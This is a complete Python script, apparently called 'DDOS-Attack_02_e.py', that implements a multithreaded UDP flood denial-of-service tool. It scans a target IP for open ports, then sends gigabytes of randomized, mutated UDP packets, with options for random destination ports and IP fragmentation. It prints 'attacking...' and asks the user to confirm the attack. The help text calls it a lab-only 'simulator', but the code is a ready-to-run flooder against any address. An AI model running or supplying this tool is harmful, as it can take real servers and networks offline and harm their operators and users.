#!/usr/bin/env python3
# -*- coding: utf-8 -*-


import sys
import os
import time
import socket
import ipaddress
import random
import argparse
import threading
import errno as errno_mod


# ==================== Constants ====================
IP_HEADER_LEN = 20
UDP_HEADER_LEN = 8
MIN_PAYLOAD = 28
MAX_PAYLOAD = 65000
DEFAULT_PAYLOAD = 1490
FRAG_PAYLOAD = 3000
RATE_LIMITER_MAX_WAIT = 0.1  # seconds
QUICK_SCAN_PORTS = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]


# ==================== Config ====================
class Config:
    def __init__(self):
        self.target_ip = None
        self.target_port = None
        self.gb = 0.0
        self.packet_size = -1
        self.num_threads = 4
        self.burst_size = 50
        self.rate_limit = 0.0
        self.duration = 0
        self.src_port_base = -1
        self.random_target_port = False
        self.fragment = False
        self.vary_payload = True
        self.log_file = None
        self.max_retries = 3
        self.assume_yes = False
        self.no_check = False
        self.scan_mode = 1
        self.scan_range = None
        self.max_pps = 0
        self.max_mbps = 0
        # Computed
        self.total_packets = 0
        self.payload_size = 0
        self.overhead = 0
        self.total_wire_bytes = 0


# ==================== Stats ====================
class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.sent = 0
        self.attempts = 0
        self.bytes_sent = 0
        self.dropped = 0
        self.err_bind = 0
        self.err_port_unreach = 0
        self.err_io = 0
        self.err_other = 0
        self.recent_errors = []
        self.recent_errors_max = 10
        self.err_limiter = ErrorRateLimiter(5)

    def try_reserve_batch(self, n, limit):
        # Strictly reserve up to n attempts; returns actual reserved count
        with self.lock:
            remaining = limit - self.attempts
            if remaining <= 0:
                return 0
            to_reserve = min(n, remaining)
            self.attempts += to_reserve
            return to_reserve

    def record_error(self, category, tag, detail):
        with self.lock:
            if category == "bind":
                self.err_bind += 1
            elif category == "port_unreach":
                self.err_port_unreach += 1
            elif category == "io":
                self.err_io += 1
            else:
                self.err_other += 1
        if self.err_limiter.allow():
            with self.lock:
                self.recent_errors.append(f"[{tag}] {category}: {detail}")
                while len(self.recent_errors) > self.recent_errors_max:
                    self.recent_errors.pop(0)

    def snapshot(self):
        with self.lock:
            return {
                'sent': self.sent,
                'attempts': self.attempts,
                'bytes': self.bytes_sent,
                'dropped': self.dropped,
                'err_bind': self.err_bind,
                'err_port_unreach': self.err_port_unreach,
                'err_io': self.err_io,
                'err_other': self.err_other,
                'recent_errors': list(self.recent_errors),
            }


class ErrorRateLimiter:
    def __init__(self, max_per_sec):
        self.max_per_sec = max_per_sec
        self.window_start = time.time()
        self.count = 0
        self.suppressed = 0
        self.lock = threading.Lock()

    def allow(self):
        with self.lock:
            now = time.time()
            if now - self.window_start > 1.0:
                self.window_start = now
                self.count = 0
            if self.count < self.max_per_sec:
                self.count += 1
                return True
            self.suppressed += 1
            return False

    def get_suppressed(self):
        with self.lock:
            return self.suppressed


class GlobalRateLimiter:
    # Single shared token bucket. Long-term rate = burst_size / rate_limit pps
    def __init__(self, seconds_per_burst, burst_size):
        if seconds_per_burst > 0 and burst_size > 0:
            tps = burst_size / seconds_per_burst
            if tps < 0.001:
                print("[!] rateLimit too large, tokensPerSecond floored at 0.001")
                tps = 0.001
            self.tokens_per_second = tps
            self.max_tokens = max(1.0, burst_size * 2.0)
        else:
            self.tokens_per_second = 0
            self.max_tokens = 0
        self.tokens = self.max_tokens
        self.last_refill = time.perf_counter()
        self.cond = threading.Condition()

    def acquire(self, n):
        if self.tokens_per_second <= 0:
            return
        if n <= 0:
            return
        while True:
            with self.cond:
                self._refill()
                if self.tokens >= n:
                    self.tokens -= n
                    return
                needed = n - self.tokens
                needed_sec = needed / self.tokens_per_second
                wait_sec = min(RATE_LIMITER_MAX_WAIT, max(0.001, needed_sec))
                self.cond.wait(wait_sec)

    def _refill(self):
        now = time.perf_counter()
        elapsed = now - self.last_refill
        if elapsed > 0:
            self.tokens = min(self.max_tokens, self.tokens + elapsed * self.tokens_per_second)
            self.last_refill = now


class BandwidthGuard:
    # Limits both packet rate and byte rate per second
    def __init__(self, max_pps, max_mbps):
        self.max_pps = max_pps
        self.max_bytes_per_sec = max_mbps * 1024 * 1024 / 8 if max_mbps > 0 else 0
        self.window_start = time.perf_counter()
        self.window_packets = 0
        self.window_bytes = 0
        self.lock = threading.Lock()

    def allow(self, pkt_bytes):
        if self.max_pps <= 0 and self.max_bytes_per_sec <= 0:
            return True
        with self.lock:
            now = time.perf_counter()
            if now - self.window_start >= 1.0:
                self.window_start = now
                self.window_packets = 0
                self.window_bytes = 0
            if self.max_pps > 0 and self.window_packets >= self.max_pps:
                return False
            if self.max_bytes_per_sec > 0 and self.window_bytes + pkt_bytes > self.max_bytes_per_sec:
                return False
            self.window_packets += 1
            self.window_bytes += pkt_bytes
            return True


class Logger:
    def __init__(self, path=None):
        self.lock = threading.Lock()
        self.fp = None
        if path:
            try:
                self.fp = open(path, 'a', encoding='utf-8')
                self.fp.write(f"\n--- Session started at {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
                self.fp.flush()
            except OSError as e:
                print(f"[!] Cannot open log file: {e}", file=sys.stderr)

    def log(self, msg):
        with self.lock:
            print(msg)
            if self.fp:
                self.fp.write(msg + '\n')
                self.fp.flush()

    def err(self, msg):
        with self.lock:
            print(msg, file=sys.stderr)
            if self.fp:
                self.fp.write(msg + '\n')
                self.fp.flush()

    def close(self):
        with self.lock:
            if self.fp:
                self.fp.close()
                self.fp = None


# ==================== Helpers ====================
def check_target(ip, port, timeout=1.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


def discover_open_port(ip, port_range, logger):
    logger.log(f"[>] Scanning ports {min(port_range)}-{max(port_range)}...")
    try:
        for p in port_range:
            logger.log(f"[>] Probing port: {p}")
            if check_target(ip, p):
                return p
    except KeyboardInterrupt:
        logger.log("\n[!] Scan interrupted")
        return None
    return None


def select_scan_range(cfg, logger):
    if cfg.scan_range:
        try:
            start_str, end_str = cfg.scan_range.split('-')
            start = int(start_str)
            end = int(end_str)
            if 1 <= start <= end <= 65535:
                return range(start, end + 1)
        except (ValueError, AttributeError):
            logger.err("[!] Invalid --scan-range, using default")
    if cfg.scan_mode == 2:
        return range(1, 65536)
    return QUICK_SCAN_PORTS


def build_variant_pool(base_size, pool_size, vary, rnd):
    pool = []
    if not vary:
        one = bytearray(rnd.getrandbits(8) for _ in range(base_size))
        pool.append(one)
        return pool
    delta = max(1, base_size // 10)
    for _ in range(pool_size):
        length = base_size - delta + rnd.randint(0, delta * 2)
        length = max(MIN_PAYLOAD, min(length, MAX_PAYLOAD))
        pool.append(bytearray(rnd.getrandbits(8) for _ in range(length)))
    return pool


def mutate_payload(payload, counter, rnd):
    n = len(payload)
    if n >= 8:
        c = counter
        for b in range(8):
            payload[n - 1 - b] = c & 0xFF
            c >>= 8
    if n >= 24:
        for b in range(16):
            idx = 4 + b
            payload[idx] ^= rnd.randint(0, 255)


# ==================== Argument parsing ====================
def parse_args():
    parser = argparse.ArgumentParser(
        description="UDP flood simulator (pure command-line, authorized lab only)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  python3 DDOS-Attack_02_e.py -t 192.168.1.100 -p 53 -g 1
  python3 DDOS-Attack_02_e.py -t 10.0.0.1 -g 1 --scan-mode 1
  python3 DDOS-Attack_02_e.py -t 10.0.0.1 -p 53 -g 1 -P 8 -b 100 -y
  python3 DDOS-Attack_02_e.py -t 10.0.0.1 -p 53 -g 1 --max-pps 10000
"""
    )
    parser.add_argument('-t', '--target', required=True, help='Target IP')
    parser.add_argument('-p', '--port', type=int, default=None,
                        help='Target port (omit for auto-scan)')
    parser.add_argument('-g', '--gb', type=float, required=True,
                        help='Total traffic in GB')
    parser.add_argument('-P', '--processes', type=int, default=4,
                        help='Thread count (default 4)')
    parser.add_argument('-T', '--threads', type=int, default=None,
                        help='Same as -P (alias)')
    parser.add_argument('-b', '--burst', type=int, default=50,
                        help='Packets per burst (default 50)')
    parser.add_argument('-r', '--rate', type=float, default=0.0,
                        help='Seconds per burst, global rate = burstSize/rate pps')
    parser.add_argument('-d', '--duration', type=int, default=0,
                        help='Duration in seconds (default 0 = until finished)')
    parser.add_argument('-s', '--src-port', type=int, default=-1,
                        help='Source port base, -1 = random (default -1)')
    parser.add_argument('--size', type=int, default=None,
                        help='Payload size in bytes (default 1490, 3000 with --fragment)')
    parser.add_argument('--random-port', action='store_true',
                        help='Randomize target port per packet')
    parser.add_argument('--fragment', action='store_true',
                        help='Enable IP fragmentation (payload 3000)')
    parser.add_argument('--no-vary', action='store_true',
                        help='Disable payload variation')
    parser.add_argument('--max-pps', type=int, default=0,
                        help='Packet rate cap (0 = unlimited)')
    parser.add_argument('--max-mbps', type=int, default=0,
                        help='Bandwidth cap in Mbps (0 = unlimited)')
    parser.add_argument('--no-check', action='store_true',
                        help='Skip TCP reachability check when -p is given')
    parser.add_argument('--scan-mode', type=int, default=1, choices=[1, 2, 3],
                        help='Port scan mode: 1=quick, 2=full, 3=custom (--scan-range)')
    parser.add_argument('--scan-range', default=None,
                        help='Custom port range for scan (e.g. 1-1000)')
    parser.add_argument('-y', '--yes', action='store_true',
                        help='Skip interactive confirmation')
    parser.add_argument('--log', default=None, help='Log file path')
    parser.add_argument('--max-retries', type=int, default=3,
                        help='Max retries per packet (default 3)')
    parser.add_argument('--selftest', action='store_true',
                        help='Run internal unit tests and exit')
    return parser.parse_args()


def build_config(args):
    cfg = Config()
    try:
        ipaddress.ip_address(args.target)
        cfg.target_ip = args.target
    except ValueError:
        print(f"[!] Invalid target IP: {args.target}", file=sys.stderr)
        return None

    cfg.target_port = args.port
    if cfg.target_port is not None and not (1 <= cfg.target_port <= 65535):
        print(f"[!] Port out of range: {cfg.target_port}", file=sys.stderr)
        return None

    cfg.gb = args.gb
    if cfg.gb <= 0:
        print("[!] GB must be > 0", file=sys.stderr)
        return None

    cfg.num_threads = args.threads if args.threads is not None else args.processes
    if cfg.num_threads < 1:
        print("[!] Thread count must be >= 1", file=sys.stderr)
        return None

    cfg.burst_size = args.burst
    if cfg.burst_size < 1:
        print("[!] Burst must be >= 1", file=sys.stderr)
        return None

    cfg.rate_limit = args.rate
    if cfg.rate_limit < 0:
        print("[!] Rate must be >= 0", file=sys.stderr)
        return None

    cfg.duration = args.duration
    if cfg.duration < 0:
        print("[!] Duration must be >= 0", file=sys.stderr)
        return None

    cfg.src_port_base = args.src_port
    if cfg.src_port_base != -1 and not (1 <= cfg.src_port_base <= 65535):
        print("[!] src-port must be -1 or 1-65535", file=sys.stderr)
        return None

    if args.size is not None:
        cfg.packet_size = args.size
    elif args.fragment:
        cfg.packet_size = FRAG_PAYLOAD
    else:
        cfg.packet_size = DEFAULT_PAYLOAD

    cfg.random_target_port = args.random_port
    cfg.fragment = args.fragment
    cfg.vary_payload = not args.no_vary
    cfg.max_pps = args.max_pps
    cfg.max_mbps = args.max_mbps
    cfg.no_check = args.no_check
    cfg.scan_mode = args.scan_mode
    cfg.scan_range = args.scan_range
    cfg.assume_yes = args.yes
    cfg.log_file = args.log
    cfg.max_retries = args.max_retries
    if cfg.max_retries < 0:
        print("[!] max-retries must be >= 0", file=sys.stderr)
        return None
    return cfg


def finalize_config(cfg):
    if cfg.packet_size < MIN_PAYLOAD:
        cfg.packet_size = MIN_PAYLOAD
    if cfg.packet_size > MAX_PAYLOAD:
        cfg.packet_size = MAX_PAYLOAD
    cfg.payload_size = cfg.packet_size
    cfg.overhead = IP_HEADER_LEN + UDP_HEADER_LEN
    cfg.total_wire_bytes = cfg.payload_size + cfg.overhead
    target_bytes = int(cfg.gb * 1024 * 1024 * 1024)
    cfg.total_packets = target_bytes // cfg.total_wire_bytes
    if cfg.total_packets <= 0:
        cfg.total_packets = 0


# ==================== UDP socket factory ====================
def open_udp_socket(bind_port, fragment, tag, stats):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    except OSError:
        pass
    if bind_port > 0:
        try:
            sock.bind(('', bind_port))
        except OSError as e:
            stats.record_error("bind", tag, f"port {bind_port}: {e}")
    if fragment:
        try:
            if hasattr(socket, 'IP_MTU_DISCOVER') and hasattr(socket, 'IP_PMTUDISC_DONT'):
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER,
                                socket.IP_PMTUDISC_DONT)
        except OSError as e:
            stats.record_error("io", tag, f"fragment setup: {e}")
    return sock


# ==================== Send with retry ====================
def send_udp_with_retry(sock, payload, target, max_retries, tag, stats):
    for attempt in range(max_retries + 1):
        try:
            sock.sendto(payload, target)
            return True
        except ConnectionRefusedError:
            stats.record_error("port_unreach", tag, str(target))
        except OSError as e:
            stats.record_error("io", tag, f"E{e.errno}: {e}")
    return False


# ==================== Worker ====================
def udp_worker(thread_id, cfg, stats, limiter, guard, stop_event, logger):
    tag = f"T{thread_id}"
    rnd = random.Random(thread_id * 0x9E3779B1)
    pool = build_variant_pool(cfg.payload_size, 512, cfg.vary_payload, rnd)

    bind_port = cfg.src_port_base + thread_id if cfg.src_port_base >= 0 else 0

    sock = None
    sent = 0
    bytes_sent = 0
    dropped = 0
    last_sent = 0
    last_bytes = 0
    last_dropped = 0
    packet_counter = 0
    consecutive_fail = 0

    try:
        sock = open_udp_socket(bind_port, cfg.fragment, tag, stats)

        while not stop_event.is_set():
            reserved = stats.try_reserve_batch(cfg.burst_size, cfg.total_packets)
            if reserved <= 0:
                break

            try:
                limiter.acquire(reserved)
            except Exception:
                break

            for _ in range(reserved):
                if stop_event.is_set():
                    break

                payload = pool[packet_counter % len(pool)]
                if cfg.vary_payload:
                    mutate_payload(payload, packet_counter, rnd)
                packet_counter += 1

                if cfg.random_target_port:
                    target = (cfg.target_ip, rnd.randint(1, 65535))
                else:
                    target = (cfg.target_ip, cfg.target_port)

                if not guard.allow(cfg.total_wire_bytes):
                    time.sleep(0.001)
                    continue

                if send_udp_with_retry(sock, payload, target, cfg.max_retries, tag, stats):
                    sent += 1
                    bytes_sent += cfg.total_wire_bytes
                    consecutive_fail = 0
                else:
                    dropped += 1
                    consecutive_fail += 1
                    if consecutive_fail >= 3:
                        try:
                            time.sleep(min(1.0, 0.01 * (1 << min(consecutive_fail - 3, 6))))
                        except InterruptedError:
                            break
                        # Rebuild socket if broken
                        if sock:
                            try:
                                sock.close()
                            except OSError:
                                pass
                        sock = open_udp_socket(bind_port, cfg.fragment, tag, stats)

            with stats.lock:
                stats.sent += sent - last_sent
                stats.bytes_sent += bytes_sent - last_bytes
                stats.dropped += dropped - last_dropped
            last_sent = sent
            last_bytes = bytes_sent
            last_dropped = dropped

    except Exception as e:
        if not stop_event.is_set():
            stats.record_error("other", tag, f"fatal: {e}")
    finally:
        if sock:
            try:
                sock.close()
            except OSError:
                pass
        with stats.lock:
            stats.sent += sent - last_sent
            stats.bytes_sent += bytes_sent - last_bytes
            stats.dropped += dropped - last_dropped


# ==================== Progress monitor ====================
def monitor_progress(cfg, stats, stop_event, logger):
    start = time.time()
    last_report = start
    last_sent = 0
    try:
        while not stop_event.is_set():
            time.sleep(0.5)
            now = time.time()
            elapsed = now - start
            snap = stats.snapshot()
            if snap['attempts'] >= cfg.total_packets:
                break
            if cfg.duration > 0 and elapsed >= cfg.duration:
                stop_event.set()
                break
            if now - last_report >= 1.0:
                delta_sent = snap['sent'] - last_sent
                dt = now - last_report
                inst = delta_sent / dt if dt > 0 else 0
                avg = snap['sent'] / elapsed if elapsed > 0 else 0
                gb = snap['bytes'] / (1024 ** 3)
                total_err = (snap['err_bind'] + snap['err_port_unreach']
                             + snap['err_io'] + snap['err_other'])
                logger.log(f"[+] sent={snap['sent']} attempts={snap['attempts']}  "
                           f"data={gb:.4f}GB  rate={avg:.0f}pps  inst={inst:.0f}pps  "
                           f"drop={snap['dropped']}  err={total_err}")
                last_report = now
                last_sent = snap['sent']
    except KeyboardInterrupt:
        stop_event.set()


# ==================== Summary / final stats ====================
def print_summary(cfg, logger):
    logger.log("")
    logger.log(f"[+] target={cfg.target_ip}:{cfg.target_port}  proto=UDP  "
               f"traffic={cfg.gb:.2f}GB  packets={cfg.total_packets}  "
               f"threads={cfg.num_threads}  payload={cfg.payload_size}B  wire={cfg.total_wire_bytes}B"
               + ("  random-port" if cfg.random_target_port else "")
               + ("  fragment" if cfg.fragment else ""))
    if cfg.rate_limit > 0:
        logger.log(f"[+] Global rate: {cfg.burst_size / cfg.rate_limit:.0f} pps")
    if cfg.max_pps > 0:
        logger.log(f"[+] Packet rate cap: {cfg.max_pps} pps")
    if cfg.max_mbps > 0:
        logger.log(f"[+] Bandwidth cap: {cfg.max_mbps} Mbps")
    logger.log(f"[+] Attempts strictly capped at {cfg.total_packets}")
    logger.log("[+] attacking... (Ctrl+C to stop)")


def print_final_stats(cfg, stats, elapsed, logger):
    snap = stats.snapshot()
    gb = snap['bytes'] / (1024 ** 3)
    rate = snap['sent'] / elapsed if elapsed > 0 else 0
    logger.log("")
    logger.log("[=] done:")
    logger.log(f"    packets sent:    {snap['sent']}")
    logger.log(f"    packets dropped: {snap['dropped']}")
    logger.log(f"    total attempts:  {snap['attempts']} / {cfg.total_packets}")
    logger.log(f"    total data:      {gb:.4f} GB")
    logger.log(f"    elapsed:         {elapsed:.2f}s")
    logger.log(f"    average rate:    {rate:.1f} pps")
    logger.log(f"    errors:          bind={snap['err_bind']} "
               f"port-unreach={snap['err_port_unreach']} "
               f"io={snap['err_io']} other={snap['err_other']} "
               f"(log suppressed={stats.err_limiter.get_suppressed()})")
    if snap['recent_errors']:
        logger.log("    recent errors:")
        for e in snap['recent_errors']:
            logger.log(f"      {e}")


# ==================== Self-test ====================
def run_selftest():
    print("[selftest] running...")
    failed = 0

    # Test 1: finalize clamps packet size
    cfg = Config()
    cfg.packet_size = 1
    cfg.gb = 1.0
    finalize_config(cfg)
    if cfg.packet_size != MIN_PAYLOAD:
        failed += 1
        print("[selftest] FAIL: size lower clamp", file=sys.stderr)

    cfg = Config()
    cfg.packet_size = 999_999
    cfg.gb = 1.0
    finalize_config(cfg)
    if cfg.packet_size != MAX_PAYLOAD:
        failed += 1
        print("[selftest] FAIL: size upper clamp", file=sys.stderr)

    # Test 2: totalPackets uses wire size
    cfg = Config()
    cfg.packet_size = 100
    cfg.gb = 1.0
    finalize_config(cfg)
    expected = int(1 * 1024 * 1024 * 1024) // (100 + IP_HEADER_LEN + UDP_HEADER_LEN)
    if cfg.total_packets != expected:
        failed += 1
        print(f"[selftest] FAIL: totalPackets math got {cfg.total_packets} expected {expected}",
              file=sys.stderr)

    # Test 3: strict attempts cap
    s = Stats()
    reserved_total = 0
    for _ in range(1000):
        reserved_total += s.try_reserve_batch(1, 100)
    if reserved_total != 100:
        failed += 1
        print(f"[selftest] FAIL: reserve cap got {reserved_total}", file=sys.stderr)
    if s.attempts != 100:
        failed += 1
        print("[selftest] FAIL: attempts != 100", file=sys.stderr)

    # Test 4: GlobalRateLimiter extreme rate
    try:
        g = GlobalRateLimiter(1_000_000.0, 50)
        if g.tokens_per_second <= 0:
            failed += 1
            print("[selftest] FAIL: tokens_per_second <= 0", file=sys.stderr)
    except Exception as e:
        failed += 1
        print(f"[selftest] FAIL: GlobalRateLimiter construction: {e}", file=sys.stderr)

    # Test 5: BandwidthGuard
    bg = BandwidthGuard(100, 0)
    allowed = sum(1 for _ in range(200) if bg.allow(1000))
    if allowed > 100:
        failed += 1
        print(f"[selftest] FAIL: BandwidthGuard allowed {allowed} > 100", file=sys.stderr)

    # Test 6: payload pool bounds
    rnd = random.Random(42)
    pool = build_variant_pool(1000, 10, True, rnd)
    for p in pool:
        if len(p) < MIN_PAYLOAD or len(p) > MAX_PAYLOAD:
            failed += 1
            print(f"[selftest] FAIL: payload length {len(p)}", file=sys.stderr)
            break

    if failed == 0:
        print("[selftest] all tests passed")
        return True
    print(f"[selftest] {failed} test(s) failed", file=sys.stderr)
    return False


# ==================== Main ====================
def main():
    args = parse_args()

    if args.selftest:
        return 0 if run_selftest() else 1

    cfg = build_config(args)
    if cfg is None:
        return 1

    finalize_config(cfg)
    if cfg.total_packets <= 0:
        print("[!] Traffic too small after finalization", file=sys.stderr)
        return 1

    logger = Logger(cfg.log_file)

    # Port resolution
    if cfg.target_port is None:
        logger.log("[>] No port specified, starting scan...")
        ports = select_scan_range(cfg, logger)
        cfg.target_port = discover_open_port(cfg.target_ip, ports, logger)
        if cfg.target_port is None:
            logger.err("[!] No open port found, cannot continue")
            logger.close()
            return 1
        logger.log(f"[+] Discovered port: {cfg.target_port}")
    elif not cfg.no_check:
        logger.log(f"[>] Checking port {cfg.target_port}...")
        if not check_target(cfg.target_ip, cfg.target_port):
            logger.log(f"[!] TCP {cfg.target_port} unreachable (UDP may still work)")

    stats = Stats()
    limiter = GlobalRateLimiter(cfg.rate_limit, cfg.burst_size)
    guard = BandwidthGuard(cfg.max_pps, cfg.max_mbps)
    stop_event = threading.Event()

    print_summary(cfg, logger)

    # Confirm
    if not cfg.assume_yes:
        if not sys.stdin.isatty():
            logger.err("[!] No TTY, add -y/--yes for non-interactive use")
            logger.close()
            return 1
        try:
            print("\n[!] Confirm attack (yes/no): ", end='', flush=True)
            line = input().strip().lower()
            if line != 'yes':
                logger.log("[>] Cancelled")
                logger.close()
                return 0
        except (EOFError, KeyboardInterrupt):
            logger.log("\n[>] Cancelled")
            logger.close()
            return 0

    # Start workers
    start_time = time.time()
    workers = []
    for i in range(cfg.num_threads):
        t = threading.Thread(
            target=udp_worker,
            args=(i, cfg, stats, limiter, guard, stop_event, logger),
            daemon=True,
        )
        t.start()
        workers.append(t)

    monitor_progress(cfg, stats, stop_event, logger)

    stop_event.set()
    for t in workers:
        t.join(timeout=2)

    elapsed = time.time() - start_time
    print_final_stats(cfg, stats, elapsed, logger)
    logger.close()
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user", file=sys.stderr)
        sys.exit(1)
